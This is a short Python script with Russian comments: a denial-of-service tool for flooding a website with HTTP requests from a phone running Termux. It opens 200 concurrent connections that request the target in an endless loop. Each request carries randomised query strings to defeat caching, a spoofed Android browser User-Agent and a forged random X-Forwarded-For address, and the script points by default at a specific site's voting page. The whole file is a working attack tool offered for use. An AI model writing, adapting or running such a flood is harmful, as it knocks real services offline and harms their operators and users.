import asyncio
import aiohttp
import random
import string
import sys

# Для мобилы 200-300 — это край. Если телефон топ, пробуй 500.
# Больше — Termux просто вылетит с ошибкой "Too many open files".
MAX_CONNS = 200

async def attack(target_url, semaphore):
    def get_random_param():
        return ''.join(random.choices(string.ascii_letters + string.digits, k=7))

    # Используем одну сессию на "поток", чтобы не тратить время на хендшейки
    timeout = aiohttp.ClientTimeout(total=15)
    connector = aiohttp.TCPConnector(limit=0, ssl=False, ttl_dns_cache=300)
    
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        while True:
            async with semaphore:
                url = f"{target_url}?{get_random_param()}={get_random_param()}"
                
                # Косим под Android-браузер
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                    'Accept': '*/*',
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                }
                
                try:
                    async with session.get(url, headers=headers) as response:
                        # В Termux вывод лучше делать реже, а то терминал будет тормозить проц
                        if random.random() > 0.95: # Печатаем только 5% ответов
                            print(f"[*] Снаряд долетел: {response.status}")
                except Exception:
                    pass
            
            await asyncio.sleep(0.05) # Чуть больше пауза для мобильного стека

async def main(url):
    sem = asyncio.Semaphore(MAX_CONNS)
    print(f"[*] Запускаем карманный фаербол на {MAX_CONNS} коннектов...")
    print(f"[*] Цель: {url}")
    
    tasks = [attack(url, sem) for _ in range(MAX_CONNS)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    # Можно передать URL аргументом: python script.py http://site.com
    target = sys.argv[1] if len(sys.argv) > 1 else "http://1367.ru/vote"
    
    try:
        asyncio.run(main(target))
    except KeyboardInterrupt:
        print("\n[!] Батарея цела, атака стоп.")